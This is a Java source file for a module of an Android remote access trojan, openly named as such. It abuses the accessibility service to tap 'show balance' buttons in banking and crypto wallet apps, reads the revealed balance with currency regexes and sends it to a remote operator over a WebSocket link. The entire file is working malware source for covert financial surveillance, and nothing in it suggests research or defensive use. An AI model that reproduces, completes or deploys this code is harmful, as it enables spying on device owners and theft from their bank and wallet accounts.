package com.phantom.rat;

import android.content.Context;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class FinScraper {
    private static final Pattern[] BALANCE = {
        Pattern.compile("[$€£¥]\\s?\\d{1,3}(?:[.,]\\d{3})*(?:[.,]\\d{2})?"),
        Pattern.compile("\\d{1,3}(?:[.,]\\d{3})*(?:[.,]\\d{2})\\s?(?:USD|EUR|GBP|USDT|\\$|€|£|₮)")
    };
    private static final String[] SHOW = {"show balance", "display balance", "view balance",
            "reveal balance", "saldo anzeigen", "ver saldo", "voir le solde", "mostrar saldo",
            "show my balance", "tap to view"};

    private FinScraper() {}

    /** Command entry — arms the scraper; AccessibilityModule drives it on window events. */
    public static String scrape(Context ctx, String args) {
        try {
            JSONObject o = new JSONObject(args == null ? "{}" : args);
            String app = o.optString("app", "all");
            AccessibilityModule.setScrapeTarget(app);
            WebSocketClient w = WebSocketClient.getInstance();
            if (w != null) w.sendLog("balance", "scrape armed for " + app);
            return "balance scan armed (" + app + ")";
        } catch (Exception e) {
            return "scrape error: " + e.getMessage();
        }
    }

    public static void scan(AccessibilityNodeInfo root, String pkg, String target) {
        if (root == null) return;
        for (String s : SHOW) {
            List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(s);
            for (AccessibilityNodeInfo n : nodes) {
                AccessibilityNodeInfo click = n.isClickable() ? n : n.getParent();
                if (click != null && click.isClickable()) {
                    click.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return; // balance reveals after content change → next scan reads it
                }
            }
        }
        String found = findBalance(root);
        if (found != null) {
            WebSocketClient w = WebSocketClient.getInstance();
            if (w != null) w.sendBalance(target, found);
            AccessibilityModule.setScrapeTarget(null);
        }
    }

    private static String findBalance(AccessibilityNodeInfo root) {
        java.util.ArrayDeque<AccessibilityNodeInfo> q = new java.util.ArrayDeque<>();
        q.add(root);
        int depth = 0;
        while (!q.isEmpty() && depth < 4000) {
            AccessibilityNodeInfo n = q.poll();
            depth++;
            if (n == null) continue;
            CharSequence t = n.getText();
            if (t != null) {
                String s = t.toString();
                for (Pattern p : BALANCE) {
                    Matcher m = p.matcher(s);
                    if (m.find()) return s.trim();
                }
            }
            for (int i = 0; i < n.getChildCount(); i++) q.add(n.getChild(i));
        }
        return null;
    }
}
